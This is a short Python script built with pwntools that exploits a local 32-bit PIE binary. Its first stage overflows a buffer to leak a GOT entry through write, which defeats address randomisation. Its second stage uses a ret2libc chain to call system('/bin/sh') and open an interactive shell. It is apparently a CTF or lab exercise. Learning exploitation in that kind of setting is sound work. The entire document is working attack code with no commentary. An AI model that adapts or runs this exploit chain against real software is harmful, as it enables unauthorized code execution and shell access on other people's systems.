from pwn import *

io = process('./pie_fpie.out')
elf = ELF('./pie_fpie.out')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

main_addr = int(io.recvline(), 16)
base_addr = main_addr - elf.sym['main']
vuln_func = base_addr + elf.sym['vuln_func']
plt_write = base_addr + elf.sym['write']
got_write = base_addr + elf.got['write']

ebx = base_addr + 0x2000			# GOT address

payload1 = "A"*132 + p32(ebx) + "AAAA" + p32(plt_write) + p32(vuln_func) + p32(1) + p32(got_write) + p32(4)

io.send(payload1)

write_addr = u32(io.recv())
system_addr = write_addr - libc.sym['write'] + libc.sym['system']
binsh_addr = write_addr - libc.sym['write'] + next(libc.search('/bin/sh'))

payload2 = "B" * 140 + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)

io.send(payload2)
io.interactive()
